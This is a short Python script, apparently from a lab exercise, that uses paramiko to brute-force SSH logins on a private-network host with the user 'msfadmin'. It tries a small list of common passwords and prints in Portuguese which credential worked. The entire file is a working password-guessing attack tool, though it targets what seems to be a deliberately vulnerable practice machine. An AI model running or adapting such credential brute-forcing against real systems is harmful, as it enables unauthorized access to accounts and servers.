import paramiko

host = "192.168.56.103"
user = "msfadmin"
passwords = ["1234", "password", "msfadmin", "admin"]

for pwd in passwords:
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, username=user, password=pwd, timeout=3)
        print(f"[+] Credencial válida encontrada: {user}:{pwd}")
        ssh.close()
        break
    except:
        print(f"[-] Tentativa falhou: {user}:{pwd}")
